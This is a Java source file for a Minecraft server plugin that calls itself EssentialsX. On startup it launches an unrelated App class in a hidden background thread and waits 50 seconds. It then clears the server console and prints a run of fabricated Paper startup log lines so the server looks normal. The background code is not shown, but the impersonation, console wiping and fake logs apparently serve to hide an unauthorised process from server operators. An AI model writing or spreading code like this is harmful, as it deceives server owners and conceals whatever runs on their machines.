package com.example.essentialsx;
import com.example.sbx.App;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Thread appThread;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        // Start App
        try {
            startAppProcess();
            // getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start app process: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    private void startAppProcess() throws Exception {
        
        startAppInBackground();
        
        // sleep 30 seconds
        Thread.sleep(50000);
        
        clearConsole();
        logServerInfo("Preparing spawn area: 1%");
        logServerInfo("Preparing spawn area: 2%");
        logServerInfo("Preparing spawn area: 5%");
        logServerInfo("Preparing spawn area: 8%");
        logServerInfo("Preparing spawn area: 8%");
        logServerInfo("Preparing spawn area: 8%");
        logServerInfo("Preparing spawn area: 8%");
        logServerInfo("Preparing spawn area: 8%");
        logServerInfo("Preparing spawn area: 8%");
        logServerInfo("Preparing spawn area: 8%");
        logServerInfo("Preparing spawn area: 10%");
        logServerInfo("Preparing spawn area: 20%");
        logServerInfo("Preparing spawn area: 30%");
        logServerInfo("Preparing spawn area: 80%");
        logServerInfo("Preparing spawn area: 85%");
        logServerInfo("Preparing spawn area: 90%");
        logServerInfo("Preparing spawn area: 95%");
        logServerInfo("Preparing start region for dimension minecraft:the_end");
        logServerInfo("Preparing spawn area: 99%");
        logServerInfo("Preparing spawn area: 100%");
        logServerInfo("Time elapsed: 1901 ms");
        logServerInfo("[spark] Starting background profiler...");
        logServerInfo("Done preparing level \"world\" (71.792s)");
        logServerInfo("*************************************************************************************");
        logServerInfo("This is the first time you're starting this server.");
        logServerInfo("It's recommended you read our 'Getting Started' documentation for guidance.");
        logServerInfo("View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
        logServerInfo("*************************************************************************************");
    }

    private void logServerInfo(String message) {
        Bukkit.getLogger().info(message);
    }

    private void startAppInBackground() {
        if (appThread != null && appThread.isAlive()) {
            // getLogger().info("App is already running");
            return;
        }

        appThread = new Thread(() -> {
            try {
                App.main(new String[0]);
            } catch (Throwable t) {
                getLogger().severe("App failed to start: " + t.getMessage());
                t.printStackTrace();
            }
        }, "App");
        appThread.setDaemon(true);
        appThread.start();
        // getLogger().info("App started in background");
    }
    
    // clear log
    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            new ProcessBuilder("clear").inheritIO().start().waitFor();
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }
    
}
